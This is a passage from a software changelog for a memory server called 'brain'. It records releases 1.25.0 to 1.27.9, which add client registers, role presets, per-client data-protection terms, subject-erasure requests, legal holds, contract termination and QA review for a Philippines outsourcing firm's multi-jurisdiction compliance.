### Release notes

- **Improvements:** Two new role presets: a **`client-auditor`** (a client's compliance login —
  a read-only view of exactly one client domain, no write/approve/purge) and a
  **`bpo-ops`** (the all-clients operations read). Both seed as editable rows.
- **Improvements:** Domain-scoped client views — a `client-auditor`'s `GET /clients` +
  `GET /clients/{name}` are filtered to its granted client-domain(s); other
  clients never appear (and are denied with no existence leak).
### Engineering record

The BPO per-client role postures + the domain-scoped client read. M1:
`role::PRESETS_RAW` gains the two presets (INSERT OR IGNORE seeded by the
existing migration — no schema bump: roles are rows, not tables). M2:
`auth::client_authorized_domains` — the pure allowlist seam mapping a
`client-auditor` principal to the non-wildcard domains of its `scopes`
(`None` = unrestricted; `Some(&[])` = sees nothing, deny-by-default). M3:
`GET /clients` + `GET /clients/{name}` in `handlers::clients.rs` enforce the
row filter (the handler still calls `authorize`, defense-in-depth); every
non-`client-auditor` principal keeps the existing Admin path gate, so
`bpo-ops`/admin/opaque all see the full register. Wire/route-coverage +
route-authz guard tables note the change; no openapi schema drift (only rows
vary).

Tests: server bin 617 → **619** passed / 6 ignored (incl. parent verification
#7: `client_auditor_sees_only_their_domain` — auditor sees only `acme-us`,
`{beta}` is 404, `bpo-ops` sees all; + `client_auditor_can_read_only` — the
read-only wedge); lib role presets parse/validate at 12; schema-contract test
pins 12 seeded roles; clippy `-D warnings` + fmt clean. Honest ceilings: this
is a read-time row filter on one deployment's register — not true multi-
tenancy (per-client authz authority/keys/independent failure) = v2.0 Cortex;
auditor tokens are not auto-provisioned (the operator binds the auditor's
`scopes` to its client domain, a documented setup step); `POST /clients`
creation stays Admin. See `IMPLEMENTATION_PLAN_v1.27.9_Roles.md`.

---



## [1.27.8] — 2026-08-15

### Server — "QaQueue"

Release 8 of 10 of the BPO Ops series. Server `Cargo.toml`/lock 1.27.7 →
**1.27.8**; schema → **1.27.8**; client + plugin unchanged.

### Release notes

- **Improvements:** Supervisor QA queue — every agent interaction that wrote memory now surfaces
  in the supervisor's per-client review queue, tagged with its agent `owner`,
  its R7 QA `qa_score`, and audited as the action happened.
- **Improvements:** Coaching — a supervisor can attach (or clear) a coaching `note` (+ advisory
  flag) on any review item, so QA feedback is recorded without blocking
  approval.
### Engineering record

The R7 QA core is wired into the review surface. Additive migration:
`proposals.owner` + `proposals.qa_note` (schema → 1.27.8), the first DDL since
R1. `ingest_proposal` attributes the candidate to the acting agent
(`principal_to_owner`; the audit actor is now the principal label); the
`ProposalView` gains `owner`/`qa_note`/`qa_score`. `src/qa.rs::score_for`
composes the R7 `scorecard` purely over the read shapes — an absent trace
degrades `cited` to the neutral corner (never NaN; proposals are not
recall-trace-linked in schema, so `has_trace` stays false). `owner_in_filtered`
narrows a page to the supervisor's `manages` set (R1 role; empty = whole
queue). `POST /clients/{name}/proposals/{id}/coach` (Admin, audited —
the note is hashed at rest) + `GET /clients/{name}/proposals` (the
owner-scoped QA queue), wired into the router + route-coverage + route-authz
guard tables + openapi.yaml. `brain client qa list|coach` are the supervisor
verbs. `approve_proposal` carries the note into the promoted chunk's `origin`.

Tests: server bin **617** passed / 6 ignored (incl. the 3 new wiring tests:
owner + scorecard round-trip, the `manages` owner filter, coach note + audit +
404); lib `qa` module tests; clippy `-D warnings` + fmt clean; schema,
route-coverage, route-authz + openapi guard audits green. Honest ceilings:
coaching is a flag + note a human decides on (never auto-discipline), it never
gates approval, and the queue is the review surface (no separate interactions
table). See `IMPLEMENTATION_PLAN_v1.27.8_QaQueue.md`.

---



## [1.27.7] — 2026-08-15

### Server — "Qa" (agent-QA core)

Release 7 of 10 of the BPO Ops series. Server `Cargo.toml`/lock 1.27.6 →
**1.27.7**; schema unchanged (`1.27.0`); client + plugin unchanged.

### Release notes

- **Improvements:** Scope-violation detection — a role-restricted agent (R1 roles narrowed its
  retrieval) that recalls across a client/perimeter border is now logged as a
  security event on the existing Auth/Denied audit channel, so the attempt has
  an audit record even though the WHERE clause already prevented the data
  returning.
- **Improvements:** Deterministic QA scorecard — a small pure 0..100 map (`scope` × `cite` ×
  confidence) that is the building block for the automated review-queue signal.
### Engineering record

Two pure functions + one call site, no schema/table/route change. `src/qa.rs`
(`scope_violation`, `scorecard`) is a dependency-free module (bin-side like
`gate.rs`); `run_recall` wires scope-violation detection into the point where
`domains_searched` is available and the role gate was applied. Reuses
`AuditKind::Auth` + `Denied` — the established security channel (the `ump_ops`
precedent) — so no audit-kind/test-lattice churn. The detection is
observational only: it never changes recall results. `scorecard` is marked
`#[allow(dead_code)]` until R8's queue renders it.

Tests: server bin **613** passed / 6 ignored (includes the 3 new `qa` tests);
clippy `-D warnings` + fmt clean (default, `bench`, and `bench,otel`). Honest
ceilings: this is QA *core*, not the queue — nothing surfaces the scorecard
yet (R8); the detection is best-effort audit, not enforcement. See
`IMPLEMENTATION_PLAN_v1.27.7_Qa.md`.

---



## [1.27.6] — 2026-08-15

### Server — "Terminate" (per-client contract-end)

Release 6 of 10 of the BPO Ops series. Server `Cargo.toml`/lock 1.27.5 →
**1.27.6**; schema unchanged (`1.27.0`); client + plugin unchanged.

### Release notes

- **Contract-end termination** — `POST /clients/{name}/end` runs the per-client
  termination clause: it erases (purge) or exports-and-freezes (return) the
  client's active memory per its DPA `retention_on_termination` — a purge DPA is
  the common posture, and the flag `--purge`/`--return` overrides the policy —
  honors per-domain legal holds (deferred on the certificate, never purged),
  then **archives** the client + its domain (`status='archived'`, `archived_at`
  stamped; the audit chain is never deleted). Returns a `TerminationCertificate`
  (`policy`, `purged_chunk_count`, `held_ids`, `exported_bundle`, `chain_head`)
  the operator keeps as the durable record. Admin + audited (kind 'client').
- **`brain client end <name> [--purge|--return] [--dataset D] [--yes]`** — the
  CLI driver with a destructive-action confirm (skipped with `--yes`).
### Engineering record

Every primitive already existed — this composes them: the domain pool's active
ids are purged via the shared `purge_chunk_ids` (erase + tombstone + orphan
sweep, the DSAR helper) excluding active holds (`active_hold_ids`), or exported
via the shared DSAR `build_export_bundle`; termination writes NO new table, the
archive is an `clients.status` toggle. Domain work runs first, the global
register archive + single audit row second — two transactions across pools
(multi-db) are not atomic, so a crash mid-way leaves the domain purged but the
row active, recoverable by re-running `end` (the archive is a no-op once
archived).

Tests: server bin 605 → **610** passed / 6 ignored, lib 105 → **106**; clippy
`-D warnings` + fmt clean; route + route-authz + openapi audits green (route `/clients/{name}/end` added to the router + guard tables, `TerminationCertificate` schema). Honest ceilings: this is the clean-exit record, NOT enforcement — gating recall on the archived status is a later release; per-client holds are deferred (the DPO decides, never auto-released); the certificate + register archive are the durable record, not a distributed transaction. See `IMPLEMENTATION_PLAN_v1.27.6_Terminate.md`.

---



## [1.27.5] — 2026-08-15

### Server — "Holds" (per-client legal-hold isolation)

Release 5 of 10 of the BPO Ops series. Server `Cargo.toml`/lock 1.27.4 →
**1.27.5**; schema unchanged (`1.27.0`); client + plugin unchanged.

### Release notes

- **Per-client legal hold** — `POST /clients/{name}/hold` freezes knowledge ids
  in **that client's** isolation domain, never another's — the proof + the
  ergonomics the v1.22 holds already promised (each domain's `legal_holds`
  table keys its own ids). The client's `domain` resolves from the register
  (404 unknown client, 409 archived, before any pool work), then the shared
  per-domain hold write freezes each id against decay, `/purge` (`409
  legal_hold_active`) and DSAR deferral (certificate `held_ids`) until
  explicitly released. Admin + audited (kind 'client').
  `brain client hold add <name> <id> ... --reason R` places holds; `brain
  client hold list <name>` shows a client's holds.
### Engineering record

- `src/handlers/holds.rs` extracts `post_legal_hold`'s body into the one
  shared `post_legal_hold_for_domain(state, principal, domain, ids, reason)`;
  the `/legal-hold` route (with `global` / its `?domain=`) and the new
  `/clients/{name}/hold` both compose it — no second hold implementation.
  `src/handlers/clients.rs` gains `client_hold` + `ClientHoldRequest`; it
  authorizes Admin, resolves the client row + status, then delegates
  (fail-closed existence check inside the per-domain tx, ids bounded by the
  shared `MAX_HOLD_IDS`, all-or-nothing). The authz-gate delegation scan learns
  `post_legal_hold_for_domain(` (the `run_recall`/`ingest_one` seam). Body
  `reason` is required non-blank (the shared `legal_hold::validate`); `ids`
  must exist in the client's domain.
  Routed + route-coverage + route-authz guard tables + openapi.yaml path in
  `src/main.rs`. `src/bin/brain.rs` extends `cmd_client` with `hold add|list`.
- Panic/unsafe sweep: zero `unwrap()`/`unsafe` outside `#[cfg(test)]` in the
  new code; no new tables or schema change; no new dependency; client + plugin
  untouched (server-only release).
- Tests: server bin **605** / 6 ignored (+2 —
  `legal_hold_per_client_isolates_domains` (identical autoincrement ids across
  acme-us + beta-eu — acme's held, beta's identical-id row free; the
  `active_hold_ids` sets differ), `client_hold_unknown_or_archived_rejected`
  (404 unknown / 409 archived before any pool work)); lib 105 unchanged; route
  + authz + openapi audits green; clippy `-D warnings` (default + bench) + fmt
  clean; `brain` release build clean.
- Honest ceilings: this is proof + ergonomics, not new hold semantics — a hold
  stays per-domain, keyed by that domain's ids; archiving a client does NOT
  auto-release holds (R6 termination); recall/DSAR hold behavior unchanged.

---



## [1.27.0] — 2026-08-15

### Server — "BPO Ops" (series root, staggered)

The parent milestone behind the 1.27.x line
(`IMPLEMENTATION_PLAN_v1.27.0_BPO_Ops.md`). It was **staggered into a
compounding chain of ten small, independently-shippable releases** (v1.27.1 …
v1.27.10) rather than cut as one large release: the full BPO-ops scope (client
register, onboarding, per-client DPA terms, jurisdiction-aware DSAR, legal-hold
isolation, termination, QA scoring, the supervisor review surface, role-scoped
client views, and the client-administration console) was too large for a single
release to land, review, and verify cleanly. Each sub-release consumes the
previous one's seams; the register shipped first (v1.27.1) is the spine the
rest read.

### Release notes

- **Series-root tracking** — this entry records the `v1.27.0` milestone and
  its decomposition into v1.27.1 … v1.27.10. No separate binaries were cut for
  `v1.27.0`; the first shipped code is `v1.27.1` (Clients).
### Engineering record

- Anchor-only release: schema remains **1.27.0** (bumped by v1.27.1) and the
  crate carries the parent-plan version with no new code — every change ships
  under a numbered sub-release that follows this entry.

---



## [1.27.4] — 2026-08-15

### Server — "Dsar" (per-client jurisdiction-aware DSAR)

Release 4 of 10 of the BPO Ops series. Server `Cargo.toml`/lock 1.27.3 →
**1.27.4**; schema unchanged (`1.27.0`); client + plugin unchanged.

### Release notes

- **Per-client DSAR** — `POST /clients/{name}/dsar` runs a subject erasure
  scoped to a single client's isolation domain, stamped with **that client's**
  jurisdiction, deadline, rights, and transfer mechanism — the "erase Client
  Beta's data on contract end" building block R6's termination composes. The
  client's `domain` + `jurisdiction` resolve from the register (404 unknown
  client, 409 archived), then the shared DSAR core locates → exports → purges
  within that one domain pool and emits a certificate carrying the client's
  jurisdiction + mechanism (advisory, from the client's transfer register).
  `action` = purge | export | both (default purge); `dry_run` previews the
  would-be footprint write-free. Admin + audited (kind 'client').
  `brain client dsar <name> <subject> [--action purge|export|both] [--dry-run]`
  drives it.
### Engineering record

- `src/handlers/observe.rs`: the one shared seam `run_dsar_subject` composes a
  single domain-pool DSAR into a full `DsarResponse` (certificate or dry-run
  footprint), jurisdiction-stamped — authorize `dsar_export`, run
  `run_dsar_pool` (no new purge path: locate/purge/export/certificate/
  legal-hold deferral all live there), audit on the global pool (the hash chain
  is the registry of record) while the ledger row lives in the run's domain,
  backfill the certificate, compute the law's deadline + rights. The inline
  `POST /dsar` subject/action validation is extracted into
  `normalize_dsar_subject` (used by both — one trust boundary, behavior-
  preserving, pin test `dsar_dry_run_footprint_counts_and_writes_nothing`
  stays green). `src/handlers/clients.rs` gains `client_dsar` (Admin +
  audited) + `ClientDsarRequest`; it resolves the client row + its transfer
  mechanism (`transfers::list` by the client's jurisdiction, `None` when none)
  then delegates. The certificate JSON shape is shared via `certificate_json`
  (both `post_dsar`'s cross-pool aggregate and `run_dsar_subject`'s single run
  build the identical contract). `src/bin/brain.rs` extends `cmd_client` with
  `dsar`.
  Routed + route-coverage + route-authz guard tables + openapi.yaml path in
  `src/main.rs`.
- Panic/unsafe sweep: zero `unwrap()`/`unsafe` outside `#[cfg(test)]` in the
  new code; no new tables or schema change; no new dependency.
- Tests: server bin **603** / 6 ignored (+3 — `per_client_dsar_scoped_to_domain`
  (beta-eu purged, acme-us untouched; EU 30-day deadline + `objection` right),
  `per_client_dsar_unknown_or_archived_client_rejected` (404/409 before any
  pool work), `per_client_dsar_shim_single_pool_no_deadlock` (a single shared
  pool at `max_size(1)` completes — the audit conn is scoped/released before
  the ledger backfill so shim mode never double-acquires)); lib 105 unchanged;
  route + authz + openapi audits green; clippy `-D warnings` (default + bench +
  otel) + fmt clean; `brain` release build clean.
- Honest ceilings: this is subject-erasure composition, **not** a whole-domain
  wipe (blanket domain erase is R6 termination); mechanism is advisory metadata
  (not gating — per-client holds are R5); the audit anchor is the server's
  global chain while the ledger row + certificate live in the client's domain
  pool.

---



## [1.27.3] — 2026-08-15

### Server — "Dpa" (per-client sub-processor DPA terms)

Release 3 of 10 of the BPO Ops series. Server `Cargo.toml`/lock 1.27.2 →
**1.27.3**; schema unchanged (`1.27.0` — the nullable `dpa_terms` column shipped
in R1); client + plugin unchanged.

### Release notes

- **Per-client DPA terms** — `POST /clients/{name}/dpa` stores the Art 28
  sub-processor terms (retention-on-termination, deletion timeline, audit
  rights, breach-notification timeline, onward-transfer restriction,
  sub-sub-processor list) on a client; `GET /clients/{name}/dpa` reads them
  back (`null` until set). This is the evidence a client's controller checks
  before authorizing the BPO. All six fields are free-text, required, and
  bounded (`<= 2000` chars; a blank field is `400 dpa_field_invalid`). Admin +
  audited on write; unknown-client 404 on both routes. `brain client dpa
  get|set <name>` drives both.
### Engineering record

- `src/clients.rs`: `DpaTerms` struct (six `String` fields, `Default` +
  `serde`), `validate_dpa_terms` (trust boundary — terms ride out to a
  controller unredacted, so nothing goes out blank/oversize; deterministic
  field order, one error naming the field), `set_dpa_terms` (scoped `WHERE
  name = ?` UPDATE returning the affected-row count → handler 404 without a
  second query), and `dpa_terms_of` (`None`-preserving JSON read). `Client`
  gains `#[serde(skip_serializing_if = "Option::is_none")] dpa_terms` parsed in
  the one row mapper; `CLIENT_SELECT` adds the column. `src/handlers/clients.rs`
  gains `set_client_dpa` (Admin + `AuditKind::Client`, detail `dpa_terms_set`) +
  `get_client_dpa` (distinguishes unknown-client 404 from unset `null`).
  `src/bin/brain.rs` extends `cmd_client` with `dpa get|set` (the `cmd_client_add`
  HTTP-shape model; `set` requires all six `--` fields). Routed + route-coverage
  + route-authz guard tables + openapi.yaml (`DpaTerms` schema, two paths) in
  `src/main.rs`.
- Panic/unsafe sweep: zero `unwrap()`/`unsafe` outside `#[cfg(test)]` in the
  new code; no new tables or schema change; no new dependency.
- Tests: server bin **600** / 6 ignored (+3 — `dpa_terms_round_trip_and_list`,
  `validate_dpa_terms_rejects_blank_and_too_long`,
  `set_dpa_terms_unknown_client_returns_zero`); lib 105 unchanged; clippy
  `-D warnings` (default + bench + otel) + fmt clean; `brain` release build
  clean.
- Honest ceilings: terms are **config + evidence**, name-checked by a human —
  not a signed contract and not enforcement; `sub_sub_processor_list` is a
  bounded text field (normalized sub-processor identity is v2.x); the
  termination *behavior* (read by R6) is a later release — nothing here
  auto-enforces retention-on-termination.

---


## [1.27.2] — 2026-08-15

### Server — "Onboard" (the operator client wizard)

Release 2 of 10 of the BPO Ops series. Server `Cargo.toml`/lock 1.27.1 →
**1.27.2**; schema unchanged (`1.27.0`); client + plugin unchanged.

### Release notes

- **`brain client add`** — one command that scaffolds a new client domain
  end-to-end: `POST /clients` now creates + migrates the client's isolation
  domain, optionally binds its law-tuned profile, and registers the `clients`
  row (from v1.27.1). `--domain` defaults to the client name (one domain per
  client); `--jurisdiction` is required; an absent `--profile` runs the preset
  pick list; `--yes` skips confirm. Idempotent — re-running for an existing
  client is a safe no-op.
### Engineering record

- `src/handlers/clients.rs` `register_client` now composes through a single
  testable seam `scaffold_and_register` in `src/clients.rs`: `pool_for`
  (creates/migrates the domain, the one creation seam) → `profile::bind`
  (v1.21 seam; unknown profile fails CLOSED `400 profile_not_found`) →
  `register` (the v1.27.1 row write). All three steps run in one
  `spawn_blocking`; the profile bind is inside the register transaction, so a
  failed bind leaves neither a `clients` row nor a `domain_profiles` bind
  (atomicity). The compose short-circuits via `by_name`, making the CLI
  re-run idempotent. `src/bin/brain.rs` gains `client` dispatch + `cmd_client_add`
  (the `cmd_ump` model; preset pick reuses the `cmd_setup` list/probe), wired
  into `main` + `print_usage`.
- Panic/unsafe sweep: zero `unwrap()`/`unsafe` outside `#[cfg(test)]` in the
  new code; no new tables or schema bump; no `/clients` DELETE (termination
  is a later release's `end`, which archives, never deletes).
- Tests: server bin **597** / 6 ignored (+2 — `create_domain_scaffolding_`
  `_is_idempotent_and_binds_profile` + `create_domain_bad_profile_fails_`
  `closed_no_client_row`, both driving the real multi-db registry + migration);
  lib 105 unchanged; clippy `-D warnings` (default + bench + otel) + fmt clean;
  `brain` release build clean. The CLI itself is thin (HTTP call); its shape is
  pinned by `parse_flags`/`post` already covered by existing CLI tests — no
  wizard integration test (R8/R10 territory).
- Honest ceilings: this is evidence + tagging, not enforcement — nothing gates
  recall or DSAR on client membership; `pool_for` still falls back to the
  shared pool in shim mode; the profile pick is the operator's judge.

---



## [1.27.1] — 2026-08-15

### Server — "Clients" (the BPO operating register)

The spine of the BPO arc (series root `IMPLEMENTATION_PLAN_v1.27.0_BPO_Ops.md`,
Release 1 of 10). Server `Cargo.toml`/lock 1.26.3 → **1.27.1**; schema →
**1.27.0**; client + plugin unchanged.

### Release notes

- **Client register** — `POST /clients`, `GET /clients`, `GET /clients/{name}`
  (Admin + audited, `kind 'client'`): one row per operating client (name /
  isolation domain / jurisdiction / bound profile / status), stored in the
  global DB like the `transfers` register it mirrors. `name` + `domain` reuse
  the existing path-safe domain validator; `jurisdiction` reuses the
  cross-border code gate (the same `400 jurisdiction_invalid` as DSAR /
  transfers). Duplicate `name` → `409 conflict`. This is the **identity /
  evidence register** that later BPO releases (onboard, DPA terms, DSAR,
  holds, termination, QA) read — it does not gate enforcement.
### Engineering record

- New `src/clients.rs` (constants n/a — reuses the domain/jurisdiction
  validators, `validate_new_client`, `register`, `list`, `by_name` + 3 unit
  tests) + `src/handlers/clients.rs` (3 routes, thin pool/authz/spawn_blocking
  surface, no test module — the transfers convention). `AuditKind::Client`
  added (exhaustive `as_str`). Migration adds the `clients` table + domain
  index, schema_version → `'1.27.0'`; `SCHEMA_VERSION_V1_27_0` added. Wired
  into the router, route-coverage + route-authz guard tables, the schema-
  contract table list + version assertion, the source-listing match, and
  openapi.yaml (`/clients`, `/clients/{name}`).
- Panic/unsafe sweep: zero `unwrap()`/`unsafe` outside `#[cfg(test)]`; every
  SQL statement parameterized (`INSERT OR IGNORE` + row-count check for the
  409, no `ON CONFLICT` churn); name/domain path-safety via the shared
  validator; jurisdiction gate reused from `transfers` (no re-write).
- Tests: server bin **595** / 6 ignored (+3); lib 105 unchanged; clippy
  `-D warnings` (default + bench + otel) + fmt clean; route-coverage +
  route-authz + schema-contract + openapi-coverage audits green.

---



## [1.26.3] — 2026-08-15

### Server — "Cross-Border" fourth pass

Server `Cargo.toml`/lock 1.26.2 → 1.26.3; client + plugin unchanged. The
pass-4/5 validator + evidence-fidelity follow-up of v1.26.2.

### Release notes

- **No backwards-dated agreements** — `POST /transfers` rejects
  `expires_at < signed_at` (`400 transfer_timestamp_invalid`): an evidence
  register must not accept an instrument expiring before it was signed.
- **Trimmed certificate mechanism** — the DSAR deletion certificate's
  `mechanism` is whitespace-trimmed like the jurisdiction field beside it
  (still free-text — the operator's exact label, without stray whitespace in
  an evidence artifact).
### Engineering record

- `validate_register` gains the signed/expiry ordering check (+2 assertions:
  `expires < signed` rejected, `signed == expiry` accepted); the DSAR
  certificate `mech_for_cert` is `map(|m| m.trim().to_string())`. openapi 400
  description updated. Panic/unsafe sweep re-verified: zero `unwrap()`/
  `unsafe` outside `#[cfg(test)]` in the new modules; pedantic/perf/complexity
  lint scan of the new modules clean.
- Tests: server bin **592** / 6 ignored; lib 105; otel-gate 594 / 6 ignored;
  clippy `-D warnings` (default + bench + otel) + fmt clean; route-coverage +
  route-authz + schema-contract + openapi-coverage audits green; client wasm
  untouched.

---



## [1.26.2] — 2026-08-15

### Server — "Cross-Border" third pass

Server `Cargo.toml`/lock 1.26.1 → 1.26.2; client + plugin unchanged. The
deep-review follow-up of v1.26.1 — evidence fidelity at the row boundary.

### Release notes

- **A NULL lawful basis stays NULL** — `GET /transfers` rows and the DPA
  artifact now serialize an unrecorded `lawful_basis` as `null` rather than
  the empty string `""` (an evidence artifact should never show a blank
  basis as if one were recorded).
- **Canonical basis spelling on write** — a mixed-case `lawful_basis`
  (`"Contract"`) is stored in the vocabulary's lowercase form (`"contract"`),
  matching how mechanism/ jurisdiction codes are normalized — validation and
  storage now agree exactly.
### Engineering record

- `Transfer.lawful_basis` becomes `Option<String>` — the None-vs-empty
  distinction survives `transfer_row` instead of `unwrap_or_default()`;
  `register` stores `b.trim().to_ascii_lowercase()` (was `str::trim` only).
  New regression `lawful_basis_stored_canonical_and_null_semantics_preserved`
  (lowercase storage + NULL→null in row and DPA). Panic/unsafe sweep over the
  new modules: zero `unwrap()`/`unsafe` outside `#[cfg(test)]`. openapi 400
  description covers the timestamp bounds.
- Tests: server bin 591 → **592** / 6 ignored; lib 105; clippy `-D warnings`
  (default + bench + otel) + fmt clean; route audits green; client wasm
  untouched.

---



## [1.26.1] — 2026-08-15

### Server — "Cross-Border" second pass

Server `Cargo.toml`/lock 1.26.0 → 1.26.1; client + plugin unchanged. The
post-review cleanup of v1.26.0 — same feature set, tighter edges. Standards
re-checked 2026-08-15: the mechanism vocabulary is current (EU SCC 2021 +
UK IDTA/Addendum both still in force — the ICO plans an update *during* 2026
and the register is a curated snapshot a human re-checks; EU-US DPF adequacy
live since 2023-07-10).

### Release notes

- **One validation site per field** — `POST /transfers` now validates
  `signed_at`/`expires_at` epoch bounds in the same shared validator as the
  rest of the payload (previously `expires_at` was checked in the handler and
  `signed_at` not at all). Invalid negative epochs → `400`
  `transfer_timestamp_invalid`.
- **Consistent register response** — `POST /transfers` returns `id` (was
  `transfer_id`) to match the `GET /transfers` rows and the `/transfers/{id}`
  artifact routes. Same `jurisdiction_invalid` code + message as the DSAR
  jurisdiction gate.
- **OpenAPI schema drift** — `/dsar` now documents `jurisdiction`/
  `mechanism` (request) + `jurisdiction`/`rights` (response) and `/ingest`
  documents `lawful_basis`/`purpose` + the `compliance.lawful_basis_missing`
  flag — fields already returned since v1.25.0/v1.26.0 but absent from the
  contract file.
### Engineering record

- `validate_register` gains the `signed_at`/`expires_at` bounds (+3
  assertions in `validate_register_bounds_fields`); dead `MAX_LIMIT*10`
  pre-clamp removed from `GET /transfers` (`list` is the single bound);
  `dsar_deadline_for` collapses two identical fallback branches via
  `and_then` on `deadline_days`; module-internal types tightened
  `pub` → `pub(crate)` (MECHANISMS, LAWFUL_BASISES, JurisdictionRule,
  SurveillancePosture, Transfer, TiaSection).
- Tests: server bin **591** / 6 ignored (unchanged — assertions grew in the
  existing bounds test); lib 105; clippy `-D warnings` (default + bench +
  otel) + fmt clean; route-coverage + route-authz audits green; client wasm
  untouched.

---



## [1.26.0] — 2026-08-15

### Server — "Cross-Border" (multi-jurisdiction client evidence, PH BPO)

Server `Cargo.toml`/lock 1.25.0 → 1.26.0; client + plugin unchanged. An
**evidence + tagging** release (no new enforcement) for a Philippines BPO
serving US/UK/EU/AU/SG/CA clients: the BPO is a sub-processor and must satisfy
RA 10173 **and** the client country's law (GDPR Art 46 SCCs + TIA, UK IDTA, US
DPF/HIPAA, AU APPs, SG PDPA, CA PIPEDA). This release ships the **cross-border
transfer register** (Art 30 + Art 46), the **per-jurisdiction DSAR deadline +
rights** surface (GDPR 30d / CCPA 45d / PH "reasonable"), the **lawful-basis +
purpose tagging** flag (Art 5/6 evidence), and the **TIA (Schrems II) + DPA
(Art 28) evidence templates** — all layered on the v1.25 breach/preference/
region primitives.

### Release notes

- **Cross-border transfer register** — `POST /transfers` records a cross-
  border data flow (`dataset`, `origin_jurisdiction`, `destination_jurisdiction`,
  `mechanism`, `counterparty`, `lawful_basis?`, `purpose`, `signed_at?`,
  `expires_at?`), `GET /transfers` lists it newest-first with exact-match
  filters (`mechanism` / `jurisdiction` / `dataset`). `mechanism` is validated
  against the registered safeguards (`scc-eu-2021`, `uk-idta`, `dpf-us`, `cbpr`,
  `bcr`, `adequacy`). Writes are Admin + audited (`kind: "transfer"`, hash-
  chained). This is the Art 30 processing-activities + Art 46 transfer-safeguard
  evidence a client's regulator asks for.
- **Per-jurisdiction DSAR deadlines + rights** — `POST /dsar` now accepts a
  `jurisdiction` (country code); when set, the response + deletion certificate
  carry the subject's law (GDPR 1 month, UK GDPR 30 days, CCPA/CPRA 45 days, AU
  APPs / SG PDPA / CA PIPEDA 30 days, PH RA 10173 "reasonable" → the operator
  window) and the jurisdiction's applicable subject rights, so the operator
  acts per the subject's law. Missing jurisdiction keeps the legacy generic
  window.
- **Lawful-basis + purpose tagging** — `POST /ingest` accepts a `purpose`
  label (alongside the v1.25 `lawful_basis`); both are stored on the record and
  surfaced on the `/export` + DSAR bundle. A strict-posture domain storing a
  record with no documented `lawful_basis` flags it in the ingest response
  (`compliance.lawful_basis_missing` — data-minimization + purpose-limitation
  evidence per NPC 2024-04 + Art 5/6).
- **TIA + DPA templates** — `GET /transfers/{id}/tia` pre-fills the Schrems II
  Transfer Impact Assessment (transfer, destination law, destination-surveillance
  posture, supplementary-measures + sign-off prompts) and `GET /transfers/{id}/dpa`
  pre-fills the Art 28 sub-processor terms (role, retention, deletion-on-
  termination, audit rights, breach-notification, onward-transfer restriction).
  Both are **evidence artifacts** a human (DPO/legal) reviews + signs — nothing
  renders legal judgment.
- **Bug fixes:** None in this release (v1.25.0 features unchanged).
- **Security fixes:** None in this release (no new auth or crypto paths).
### Engineering record

- **M1** `src/transfers.rs::register` + the `transfers` table in every domain
  DB (additive, schema → 1.26.0, guarded by the schema-contract test) +
  `src/handlers/transfers.rs` (`POST`/`GET /transfers`); validated `MECHANISMS`
  + free-text-supported `is_jurisdiction_code` (any short lowercase code, so a
  future law adds without a release).
- **M2** `JurisdictionRule` — a curated, code-versioned table (`JURISDICTIONS`:
  eu/uk/us/au/sg/ca/ph → law + deadline_days + rights). `dsar_deadline_for` is
  pure (the law's fixed days, else PH/"reasonable" → the operator
  `BRAIN_DSAR_WINDOW_DAYS`); wired into `handlers/observe.rs` for the deadline,
  certificate `jurisdiction`/`mechanism` fields, and the response `rights` list.
- **M3** `IngestRequest.purpose` + `knowledge.lawful_basis/purpose` columns +
  `idx_knowledge_purpose`; `lawful_basis_flag(strict_domain, basis)` is pure and
  surfaced as `compliance.lawful_basis_missing` on strict-posture ingests.
- **M4** `tia_from` + `dpa_fields` — the pre-filled, reviewed-not-rendered
  artifacts; `SurveillancePosture` table (`destination_posture`) gives the
  §46(2)/Schrems II prompt its destination-surveillance context.
- **Wiring**  4 routes (`/transfers`, `/transfers/{id}/tia`,
  `/transfers/{id}/dpa`) in the router + route-coverage + route-authz guard
  tables + `openapi.yaml`. `AuditKind::Transfer`.
- **Tests** — server bin **582 → 591** / 6 ignored; lib 105 unchanged. New:
  `transfer_register_records_every_cross_border_flow` (register/list/filter +
  TIA/DPA render), `dsar_deadline_matches_jurisdiction` (30/45/reasonable/
  unknown), `jurisdiction_rights_surface_are_curated`,
  `lawful_basis_strict_flagged_only_when_missing_in_strict_domain` (deep model),
  `tia_prefilled_from_register_and_posture`, `breach_scope_covers_register_
  jurisdictions` (register ↔ breach-vocabulary integration),
  `validate_register_bounds_fields`, `transfer_list_is_newest_first_and_bounded`,
  and the `dpa_fields_resolve_any_row_by_id` regression (a by-id lookup — the
  initial draft resolved only the newest row; fixed). Clippy `-D warnings`
  (default + bench + otel) + fmt clean; route-coverage + route-authz audit
  green.
- **Honest ceilings** — this is **evidence + tagging**, not enforcement: the
  operator still ships data; nothing gates a transfer on the registered
  mechanism (blocking policies are v2.x), the jurisdiction rules + surveillance
  postures are a curated snapshot **a human DPO/legal re-checks** (law evolves;
  the artifacts are pre-filled, not signed), PH "reasonable" uses the operator
  window, and each client's own *controller* obligations stay with the client —
  the BPO/brain-server remain processor/sub-processor.

---



## [1.25.0] — 2026-08-15

### Server — "PH-Compliant" (Philippines home-jurisdiction posture)

Server `Cargo.toml`/lock 1.24.0 → 1.25.0; client + plugin unchanged. An
**evidence + workflow** release for the regulated buyer in the Philippines,
honestly framed: the Philippines has **no AI statute yet** — RA 10173 (DPA
2012) + NPC advisories (2024-04 AI; 2026-01 scraping) + EO 119 (gov-data
residency) are the law in force, and **HB 7396 (risk-based AI) is pending, not
enacted**. This release documents the DPA/NPC posture (`COMPLIANCE_PH.md`),
ships the **breach-notification workflow** (the one genuinely-new primitive),
and adds the **PIA template + scraping provenance** rule — all layered on the
existing profile/role/region primitives. See
`IMPLEMENTATION_PLAN_v1.25.0_PH_Compliant.md`.

### Release notes

- **Philippines compliance annex** — `COMPLIANCE_PH.md` maps every RA 10173
  control (PIC/PIP duties, privacy-by-design, lawful basis, NPC registration,
  DPO, subject rights, EO 119 residency) to the shipped feature, with an
  HB 7396 forward-watch note. A cross-reference test pins doc ↔ code coupling.
- **Breach-notification workflow** — `POST /breach` opens an incident
  (DPO/admin role-gated, 72h PH-DPA + EU-Art-33 deadlines computed per
  affected jurisdiction), `POST /breach/{id}/event` appends an append-only
  notification/assessment log, `POST /breach/{id}/close` closes it, and
  `GET /breaches` / `GET /breaches/{id}` are the DPO/auditor ledger. Every
  event is hash-chained into the existing audit (`kind: "breach"`). Automating
  detection is v2.x — the workflow is human-opened by the DPO.
- **Scraping provenance (NPC 2026-01)** — a scrape ingest without a documented
  `lawful_basis` is **quarantined, not stored** (the v0.9.7 quarantine flag:
